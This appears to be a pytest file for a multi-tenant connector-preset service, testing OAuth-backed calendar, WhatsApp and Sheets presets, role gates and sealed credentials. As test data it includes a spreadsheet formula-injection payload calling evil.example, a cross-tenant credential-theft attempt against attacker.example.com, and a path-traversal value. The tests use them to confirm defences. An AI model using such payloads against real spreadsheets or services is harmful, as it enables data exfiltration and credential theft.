"""
Route-level tests for the connector-preset surface: the PATCH lock on preset
rows, and apply and remove end to end. Real Postgres, a real signed JWT per
user, the real connect flow against a recording provider transport, and an
httpx.MockTransport for every call the executor makes.
"""

from __future__ import annotations

import asyncio
import json
import uuid
from urllib.parse import parse_qs, urlsplit

import httpx
import pytest
import pytest_asyncio
from httpx import ASGITransport, AsyncClient

from libs.config_sdk.secrets import decrypt_tenant_secret
from libs.tenancy import set_target_tenant, tenant_conn
from services.config import auth
from services.config.auth import CurrentUser
from services.toolexec import agent_apis, custom_apis, executor, oauth, presets
from services.toolexec.app import app

from .test_chain_execution import _mock, _request

CALENDAR = {"preset_key": "calendar_booking", "timezone": "Asia/Kolkata"}
SHEETS = {"preset_key": "sheets_lead_capture"}
WHATSAPP = {"preset_key": "whatsapp_confirmation", "provider": "meta", "api_key": "SECRET-KEY-123",
            "template": "booking_confirmed", "phone_number_id": "123456789"}
CALENDAR_ROWS = ["gcal_book", "gcal_cancel", "gcal_check_slots", "gcal_find_booking", "gcal_reschedule"]


class _Provider:
    """Stands in for Google: token endpoint, user info and the Sheets API."""

    def __init__(self) -> None:
        self.requests: list[httpx.Request] = []
        self.sheets_status = 200

    def __call__(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        if request.url.host == "sheets.googleapis.com":
            if self.sheets_status != 200:
                return httpx.Response(self.sheets_status, json={"error": {"message": "nope"}})
            if request.url.path == "/v4/spreadsheets":
                return httpx.Response(200, json={"spreadsheetId": "sheet-123"})
            return httpx.Response(200, json={})
        return httpx.Response(200, json={
            "access_token": "at", "refresh_token": "rt", "expires_in": 3600,
            "id_token": "h.eyJlbWFpbCI6ICJhQGIuYyIsICJzdWIiOiAiczEifQ.s",
        })


@pytest.fixture(autouse=True)
def _platform(monkeypatch):
    monkeypatch.setenv("TOOLEXEC_OAUTH_REDIRECT_URI", "https://console.test/integrations/callback")
    monkeypatch.setenv("TOOLEXEC_OAUTH_GOOGLE_CLIENT_ID", "google-client-id")
    monkeypatch.setenv("TOOLEXEC_OAUTH_GOOGLE_CLIENT_SECRET_REF", "env:TOOLEXEC_TEST_GOOGLE_SECRET")
    monkeypatch.setenv("TOOLEXEC_TEST_GOOGLE_SECRET", "google-client-secret")

    async def _resolver(hostname, port):
        return ["93.184.216.34"]

    monkeypatch.setattr(custom_apis, "_resolve_addresses", _resolver)


@pytest.fixture
def provider(monkeypatch) -> _Provider:
    recorder = _Provider()
    monkeypatch.setattr(oauth, "_provider_transport", lambda ips: httpx.MockTransport(recorder))
    return recorder


@pytest_asyncio.fixture(loop_scope="session")
async def world(pool):
    """Tenants A and B, each with an agent and an admin, plus a viewer in A."""
    tenants, agents = {}, {}
    for name in ("a", "b"):
        slug = f"preset-{name}-{uuid.uuid4().hex[:8]}"
        tenants[name] = str((await pool.fetchrow(
            "INSERT INTO tenants (name, slug) VALUES ($1, $2) RETURNING id", slug, slug))["id"])
        agents[name] = str(await pool.fetchval(
            "INSERT INTO agents (tenant_id, slug, name) VALUES ($1, 'sup', 'Support') RETURNING id", tenants[name]))
    users = {}
    for key, tenant, role in (("admin_a", "a", "admin"), ("admin_b", "b", "admin"), ("viewer_a", "a", "viewer")):
        row = await pool.fetchrow(
            "INSERT INTO users (tenant_id, email, password_hash, role) VALUES ($1, $2, 'x', $3) "
            "RETURNING id, email, role, tenant_id",
            tenants[tenant], f"{key}-{uuid.uuid4().hex[:8]}@preset.test", role,
        )
        token = auth.create_access_token({
            "id": str(row["id"]), "email": row["email"], "role": row["role"],
            "tenant_id": str(row["tenant_id"]), "is_service_account": False,
        })
        users[key] = {"id": str(row["id"]), "headers": {"Authorization": f"Bearer {token}"}}
    yield tenants, users, agents
    set_target_tenant(None)
    ids = list(tenants.values())
    await pool.execute("DELETE FROM api_side_effect_claims WHERE tenant_id = ANY($1::uuid[])", ids)
    await pool.execute("DELETE FROM api_chain_steps WHERE run_id IN "
                       "(SELECT id FROM api_chain_runs WHERE tenant_id = ANY($1::uuid[]))", ids)
    await pool.execute("DELETE FROM api_chain_runs WHERE tenant_id = ANY($1::uuid[])", ids)
    await pool.execute("DELETE FROM agent_custom_apis WHERE agent_id = ANY($1::uuid[])", list(map(uuid.UUID, agents.values())))
    await pool.execute(
        "DELETE FROM custom_api_params WHERE custom_api_id IN "
        "(SELECT id FROM custom_apis WHERE tenant_id = ANY($1::uuid[]))", ids,
    )
    await pool.execute("DELETE FROM custom_apis WHERE tenant_id = ANY($1::uuid[])", ids)
    await pool.execute("DELETE FROM oauth_authorization_states WHERE tenant_id = ANY($1::uuid[])", ids)
    await pool.execute("DELETE FROM oauth_connections WHERE tenant_id = ANY($1::uuid[])", ids)
    await pool.execute("DELETE FROM agents WHERE tenant_id = ANY($1::uuid[])", ids)
    await pool.execute(
        "DELETE FROM audit_log WHERE user_id IN (SELECT id FROM users WHERE tenant_id = ANY($1::uuid[]))", ids,
    )
    await pool.execute("DELETE FROM users WHERE tenant_id = ANY($1::uuid[])", ids)
    await pool.execute("DELETE FROM tenants WHERE id = ANY($1::uuid[])", ids)


def _client() -> AsyncClient:
    return AsyncClient(transport=ASGITransport(app=app), base_url="http://test")


async def _preset_row(pool, tenant_id: str) -> dict:
    set_target_tenant(tenant_id)
    async with tenant_conn(pool) as conn:
        async with conn.transaction():
            return await custom_apis._insert_custom_api(
                conn, tenant_id=tenant_id, name="gcal_book", description="original",
                endpoint_url="https://example.com/api", method="POST", body_style="json",
                auth_scheme="none", auth_config={}, side_effecting=True, idempotency_header=None,
                timeout_ms=None, sensitive_response_paths=[], success_template=None, params=[],
                preset_key="calendar_booking",
            )


@pytest.mark.asyncio
async def test_patch_on_a_preset_row_is_400_preset_managed(pool, world):
    tenants, users, _agents = world
    row = await _preset_row(pool, tenants["a"])
    async with _client() as c:
        r = await c.patch(f"/custom-apis/{row['id']}", headers=users["admin_a"]["headers"],
                          json={"description": "hijacked"})
        assert (r.status_code, r.json()) == (400, {"detail": "preset_managed"})
        r = await c.patch(f"/custom-apis/{row['id']}", headers=users["admin_a"]["headers"], json={"params": []})
        assert (r.status_code, r.json()) == (400, {"detail": "preset_managed"})
    assert (await custom_apis.get_custom_api(row["id"]))["description"] == "original"


# ── helpers ───────────────────────────────────────────────────────────────

async def _connect(c, tenant: str, headers: dict, preset_key: str | None = "calendar_booking") -> dict:
    r = await c.post(f"/tenants/{tenant}/oauth-connections/google/authorize", headers=headers,
                     json={"preset_key": preset_key})
    assert r.status_code == 200, r.text
    state = parse_qs(urlsplit(r.json()["authorize_url"]).query)["state"][0]
    r = await c.post(f"/tenants/{tenant}/oauth-connections/callback", headers=headers,
                     json={"state": state, "code": "c"})
    assert r.status_code == 200, r.text
    return r.json()


async def _apply(c, tenant: str, headers: dict, body: dict):
    return await c.post(f"/tenants/{tenant}/connector-presets/{body['preset_key']}/apply", headers=headers, json=body)


async def _rows(pool, tenant: str, preset_key: str | None = None) -> list[dict]:
    rows = await pool.fetch(
        "SELECT * FROM custom_apis WHERE tenant_id = $1 AND deleted_at IS NULL "
        "AND ($2::text IS NULL OR preset_key = $2) ORDER BY name", uuid.UUID(tenant), preset_key)
    return [dict(r) for r in rows]


async def _enable(agent: str, row_ids, tenant: str) -> None:
    user = CurrentUser(id=str(uuid.uuid4()), email="a@t.example", role="admin", tenant_id=tenant)
    for row_id in row_ids:
        await agent_apis.set_enabled(uuid.UUID(agent), row_id, enabled=True, current_user=user)


# ── the catalogue and the gates ───────────────────────────────────────────

@pytest.mark.asyncio
async def test_every_console_role_can_list_the_presets(world):
    _tenants, users, _agents = world
    async with _client() as c:
        r = await c.get("/connector-presets", headers=users["viewer_a"]["headers"])
    assert r.status_code == 200
    assert [(p["key"], p["provider"]) for p in r.json()] == [
        ("calendar_booking", "google"), ("whatsapp_confirmation", None), ("sheets_lead_capture", "google"),
        ("salesforce_crm", "salesforce"), ("hubspot_crm", "hubspot"), ("zoho_crm", "zoho")]
    assert all(set(p) == {"key", "title", "provider", "setup_schema"} for p in r.json())


@pytest.mark.asyncio
async def test_apply_and_remove_are_admin_writes_scoped_to_the_path_tenant(world):
    tenants, users, _agents = world
    base = f"/tenants/{tenants['a']}/connector-presets"
    async with _client() as c:
        for who, expected in (("viewer_a", 403), ("admin_b", 403)):
            h = users[who]["headers"]
            assert (await c.post(f"{base}/calendar_booking/apply", headers=h, json=CALENDAR)).status_code == expected, who
            assert (await c.delete(f"{base}/calendar_booking", headers=h)).status_code == expected, who
        assert (await c.post(f"{base}/calendar_booking/apply", json=CALENDAR)).status_code == 401
        assert (await c.delete(f"{base}/calendar_booking")).status_code == 401


@pytest.mark.asyncio
async def test_a_bad_body_is_refused_before_anything_runs(pool, world, provider):
    tenants, users, _agents = world
    h = users["admin_a"]["headers"]
    base = f"/tenants/{tenants['a']}/connector-presets"
    async with _client() as c:
        for body in (
            {**CALENDAR, "calendar_id": "../../x"},
            {**CALENDAR, "timezone": "Mars/Base"},
            {**CALENDAR, "tenant_id": tenants["b"]},                        # no tenant field in a body
            {"preset_key": "calendar_booking", "oauth_connection_id": str(uuid.uuid4())},
            {**WHATSAPP, "phone_number_id": None},                          # Meta needs it
            {**WHATSAPP, "provider": "interakt"},                           # and Interakt does not take it
        ):
            assert (await c.post(f"{base}/{body['preset_key']}/apply", headers=h, json=body)).status_code == 422, body
        assert (await c.post(f"{base}/sheets_lead_capture/apply", headers=h, json=CALENDAR)).status_code == 400
        assert (await c.post(f"{base}/nope/apply", headers=h, json=CALENDAR)).status_code == 404
        assert (await c.delete(f"{base}/nope", headers=h)).status_code == 404
    assert await _rows(pool, tenants["a"]) == []
    assert provider.requests == []


# ── calendar: connector first, then five rows ─────────────────────────────

@pytest.mark.asyncio
async def test_applying_without_a_connected_account_is_409_and_creates_nothing(pool, world):
    tenants, users, _agents = world
    async with _client() as c:
        r = await _apply(c, tenants["a"], users["admin_a"]["headers"], CALENDAR)
    assert (r.status_code, r.json()) == (409, {"detail": "connector_required"})
    assert await _rows(pool, tenants["a"]) == []


@pytest.mark.asyncio
async def test_an_account_connected_without_the_presets_scopes_is_409_scope_required(pool, world, provider):
    tenants, users, _agents = world
    h = users["admin_a"]["headers"]
    async with _client() as c:
        await _connect(c, tenants["a"], h, preset_key=None)          # identity scopes only
        r = await _apply(c, tenants["a"], h, CALENDAR)
    assert (r.status_code, r.json()) == (409, {"detail": "connector_scope_required"})
    assert await _rows(pool, tenants["a"]) == []


@pytest.mark.asyncio
async def test_calendar_apply_writes_five_rows_on_the_connection_and_exposes_no_ref(pool, world, provider):
    tenants, users, _agents = world
    h = users["admin_a"]["headers"]
    async with _client() as c:
        connection = await _connect(c, tenants["a"], h)
        r = await _apply(c, tenants["a"], h, CALENDAR)

        assert r.status_code == 201, r.text
        rows = {row["name"]: row for row in r.json()}
        assert sorted(rows) == CALENDAR_ROWS
        assert {row["oauth_connection_id"] for row in rows.values()} == {connection["id"]}
        assert {row["preset_key"] for row in rows.values()} == {"calendar_booking"}
        assert {row["auth_scheme"] for row in rows.values()} == {"oauth2_authorization_code"}
        assert {n: row["chain_levels"] for n, row in rows.items()} == {
            "gcal_book": 1, "gcal_check_slots": 1, "gcal_find_booking": 1, "gcal_reschedule": 2, "gcal_cancel": 2}
        assert "enc:" not in r.text
        assert rows["gcal_check_slots"]["response_transform"]["timezone"] == "Asia/Kolkata"
        # No `q` on the lookup, and the caller-id params are server-side only.
        assert "q" not in {p["name"] for p in rows["gcal_find_booking"]["params"]}
        book = {p["name"]: p for p in rows["gcal_book"]["params"]}
        assert book["caller_phone"]["source"] == "caller_id" and book["caller_phone"]["sensitive"] is True

        listed = await c.get(f"/tenants/{tenants['a']}/custom-apis", headers=users["viewer_a"]["headers"])
        assert sorted(a["name"] for a in listed.json()) == CALENDAR_ROWS
    audit = await pool.fetch("SELECT * FROM audit_log WHERE entity_type = 'custom_api' AND action = 'created' "
                             "AND entity_id = ANY($1::uuid[])", [uuid.UUID(row["id"]) for row in rows.values()])
    assert len(audit) == 5


@pytest.mark.asyncio
async def test_applying_again_is_a_no_op_and_survives_disconnect_and_reconnect(pool, world, provider):
    tenants, users, _agents = world
    h = users["admin_a"]["headers"]
    async with _client() as c:
        connection = await _connect(c, tenants["a"], h)
        first = {row["name"]: row["id"] for row in (await _apply(c, tenants["a"], h, CALENDAR)).json()}

        again = await _apply(c, tenants["a"], h, CALENDAR)
        assert again.status_code == 201 and {r["name"]: r["id"] for r in again.json()} == first

        assert (await c.delete(f"/tenants/{tenants['a']}/oauth-connections/{connection['id']}", headers=h)).status_code == 200
        blocked = await _apply(c, tenants["a"], h, CALENDAR)
        assert (blocked.status_code, blocked.json()) == (409, {"detail": "connector_required"})

        reconnected = await _connect(c, tenants["a"], h)
        assert reconnected["id"] == connection["id"]                 # mutated in place, never replaced
        last = {row["name"]: row["id"] for row in (await _apply(c, tenants["a"], h, CALENDAR)).json()}

    assert last == first
    assert len(await _rows(pool, tenants["a"], "calendar_booking")) == 5


@pytest.mark.asyncio
async def test_two_simultaneous_applies_still_leave_five_rows(pool, world, provider):
    tenants, users, _agents = world
    h = users["admin_a"]["headers"]
    async with _client() as c:
        await _connect(c, tenants["a"], h)
        a, b = await asyncio.gather(_apply(c, tenants["a"], h, CALENDAR), _apply(c, tenants["a"], h, CALENDAR))
    assert (a.status_code, b.status_code) == (201, 201)
    assert {r["id"] for r in a.json()} == {r["id"] for r in b.json()}
    assert len(await _rows(pool, tenants["a"])) == 5


@pytest.mark.asyncio
async def test_a_denied_endpoint_creates_no_rows(pool, world, provider, monkeypatch):
    tenants, users, _agents = world
    h = users["admin_a"]["headers"]
    async with _client() as c:
        await _connect(c, tenants["a"], h)

        async def _private(hostname, port):
            return ["10.0.0.5"]

        monkeypatch.setattr(custom_apis, "_resolve_addresses", _private)
        r = await _apply(c, tenants["a"], h, CALENDAR)

    assert r.status_code == 400 and "10.0.0.5" not in r.text
    assert await _rows(pool, tenants["a"]) == []


@pytest.mark.asyncio
async def test_a_hand_made_api_with_a_preset_rows_name_is_a_conflict_and_rolls_everything_back(pool, world, provider):
    tenants, users, _agents = world
    h = users["admin_a"]["headers"]
    set_target_tenant(tenants["a"])
    await custom_apis.create_custom_api(
        tenant_id=tenants["a"], name="GCAL_BOOK", description="mine", endpoint_url="https://example.com/x", method="GET")
    async with _client() as c:
        await _connect(c, tenants["a"], h)
        r = await _apply(c, tenants["a"], h, CALENDAR)

    assert (r.status_code, r.json()) == (400, {"detail": "preset_name_conflict: gcal_book"})
    assert [row["name"] for row in await _rows(pool, tenants["a"])] == ["GCAL_BOOK"]   # nothing of the preset survived


# ── remove ────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_remove_is_refused_while_another_row_depends_on_it_then_soft_deletes_with_audit(pool, world, provider):
    tenants, users, _agents = world
    h = users["admin_a"]["headers"]
    async with _client() as c:
        await _connect(c, tenants["a"], h)
        applied = (await _apply(c, tenants["a"], h, CALENDAR)).json()
        find_id = next(row["id"] for row in applied if row["name"] == "gcal_find_booking")
        set_target_tenant(tenants["a"])
        mine = await custom_apis.create_custom_api(
            tenant_id=tenants["a"], name="my_report", description="d", endpoint_url="https://example.com/r", method="GET",
            params=[{"name": "slot", "location": "query", "json_type": "string", "source": "upstream",
                     "upstream_api_id": find_id, "upstream_json_path": "$.items[0].id"}])

        blocked = await c.delete(f"/tenants/{tenants['a']}/connector-presets/calendar_booking", headers=h)
        assert blocked.status_code == 409
        assert len(await _rows(pool, tenants["a"], "calendar_booking")) == 5

        await custom_apis.soft_delete_custom_api(mine["id"])
        removed = await c.delete(f"/tenants/{tenants['a']}/connector-presets/calendar_booking", headers=h)
        assert removed.status_code == 204 and removed.content == b""
        nothing_left = await c.delete(f"/tenants/{tenants['a']}/connector-presets/calendar_booking", headers=h)
        assert nothing_left.status_code == 204

    assert await _rows(pool, tenants["a"]) == []
    deleted = await pool.fetch("SELECT * FROM audit_log WHERE action = 'deleted' AND entity_id = ANY($1::uuid[])",
                               [uuid.UUID(row["id"]) for row in applied])
    assert len(deleted) == 5
    assert (await pool.fetchval("SELECT status FROM oauth_connections WHERE tenant_id = $1", uuid.UUID(tenants["a"]))) \
        == "connected"                                                # removing a preset never touches the connection


# ── WhatsApp: the key is sealed to the tenant ─────────────────────────────

@pytest.mark.asyncio
@pytest.mark.parametrize("provider_name, plaintext", [("meta", "SECRET-KEY-123"), ("interakt", "Basic SECRET-KEY-123")])
async def test_whatsapp_key_is_stored_sealed_never_returned_and_masked_for_a_viewer(
    pool, world, provider_name, plaintext,
):
    tenants, users, _agents = world
    body = {**WHATSAPP, "provider": provider_name}
    if provider_name == "interakt":
        body.pop("phone_number_id")
    async with _client() as c:
        r = await _apply(c, tenants["a"], users["admin_a"]["headers"], body)
        assert r.status_code == 201, r.text
        assert "SECRET-KEY-123" not in r.text and "enc:" not in r.text

        listed = await c.get(f"/tenants/{tenants['a']}/custom-apis", headers=users["viewer_a"]["headers"])
        (row,) = listed.json()
        assert row["session_send_cap"] == 3
        assert list(row["auth_config"].values()).count("[stored]") == 1
        assert "SECRET-KEY-123" not in listed.text and "enc:" not in listed.text

    (stored,) = await _rows(pool, tenants["a"])
    ref = next(v for k, v in json.loads(stored["auth_config"]).items() if k.endswith("_ref"))
    assert ref.startswith("enc:t1.")
    assert decrypt_tenant_secret(tenants["a"], ref) == plaintext
    audit = await pool.fetch("SELECT new_value::text FROM audit_log WHERE entity_id = $1", stored["id"])
    assert audit and all("SECRET-KEY-123" not in a["new_value"] and "enc:" not in a["new_value"] for a in audit)


@pytest.mark.asyncio
async def test_a_whatsapp_ref_copied_to_another_tenant_fails_at_write_time_and_at_call_time(pool, world, monkeypatch):
    tenants, users, agents = world
    async with _client() as c:
        assert (await _apply(c, tenants["a"], users["admin_a"]["headers"], WHATSAPP)).status_code == 201
    (stored,) = await _rows(pool, tenants["a"])
    copied = json.loads(stored["auth_config"])["token_ref"]

    # Write time: tenant B cannot register a row around A's ciphertext.
    set_target_tenant(tenants["b"])
    with pytest.raises(ValueError, match="credential_ref_outside_tenant_namespace"):
        await custom_apis.create_custom_api(
            tenant_id=tenants["b"], name="steal", description="d", endpoint_url="https://attacker.example.com/x",
            method="POST", auth_scheme="bearer", auth_config={"token_ref": copied})

    # Call time: a row that got in anyway (written past the validator) still cannot open it.
    async with tenant_conn(pool) as conn:
        async with conn.transaction():
            row = await custom_apis._insert_custom_api(
                conn, tenant_id=tenants["b"], name="steal", description="d", endpoint_url="https://attacker.example.com/x",
                method="POST", body_style="json", auth_scheme="bearer", auth_config={"token_ref": copied},
                side_effecting=False, idempotency_header=None, timeout_ms=None, sensitive_response_paths=[],
                success_template=None, params=[])
    await _enable(agents["b"], [row["id"]], tenants["b"])
    seen: list[httpx.Request] = []
    monkeypatch.setattr(executor, "_step_transport", _mock(lambda r: seen.append(r) or httpx.Response(200, json={})))

    response = await executor.execute_chain(_request({"id": tenants["b"]}, {"id": agents["b"]}, "steal"))

    assert (response.chain_status, response.error) == ("unavailable", "credential_unavailable")
    assert seen == []                                                  # nothing reached the attacker's host


# ── Sheets ────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_a_sheets_failure_creates_no_rows(pool, world, provider):
    tenants, users, _agents = world
    h = users["admin_a"]["headers"]
    async with _client() as c:
        await _connect(c, tenants["a"], h, preset_key="sheets_lead_capture")
        provider.sheets_status = 500
        r = await _apply(c, tenants["a"], h, SHEETS)

    assert (r.status_code, r.json()) == (400, {"detail": "sheet_create_failed"})
    assert await _rows(pool, tenants["a"]) == []


@pytest.mark.asyncio
async def test_sheets_apply_creates_the_sheet_once_and_the_row_appends_caller_text_raw(pool, world, provider, monkeypatch):
    tenants, users, agents = world
    h = users["admin_a"]["headers"]
    async with _client() as c:
        await _connect(c, tenants["a"], h, preset_key="sheets_lead_capture")
        r = await _apply(c, tenants["a"], h, {**SHEETS, "title": "Leads"})
        assert r.status_code == 201, r.text
        await _apply(c, tenants["a"], h, SHEETS)                    # a second apply makes no second sheet

    sheets_calls = [q for q in provider.requests if q.url.host == "sheets.googleapis.com"]
    assert [(q.method, q.url.path) for q in sheets_calls] == [
        ("POST", "/v4/spreadsheets"), ("POST", "/v4/spreadsheets/sheet-123/values/Sheet1!A1:append")]
    assert json.loads(sheets_calls[0].content)["properties"]["title"] == "Leads"
    header = sheets_calls[1]
    assert header.url.params["valueInputOption"] == "RAW"
    assert json.loads(header.content) == {"values": [["Name", "Phone", "Email", "Notes"]]}
    assert header.headers["authorization"] == "Bearer at"

    (row,) = r.json()
    assert row["name"] == "sheets_capture_lead"
    await _enable(agents["a"], [row["id"]], tenants["a"])
    seen: list[httpx.Request] = []
    monkeypatch.setattr(executor, "_step_transport",
                        _mock(lambda q: seen.append(q) or httpx.Response(200, json={"updates": {}})))
    formula = '=IMPORTXML("https://evil.example/"&A2,"//a")'

    response = await executor.execute_chain(_request(
        {"id": tenants["a"]}, {"id": agents["a"]}, "sheets_capture_lead",
        caller_arguments={"lead_name": formula, "lead_phone": "+91 98123 45678"}))

    assert response.chain_status == "success", response
    (append,) = seen
    assert append.url.path == "/v4/spreadsheets/sheet-123/values/Sheet1!A1:append"
    assert append.url.params["valueInputOption"] == "RAW"
    assert json.loads(append.content) == {"values": [[formula, "+91 98123 45678"]]}   # the text is untouched
    assert append.headers["authorization"] == "Bearer at"
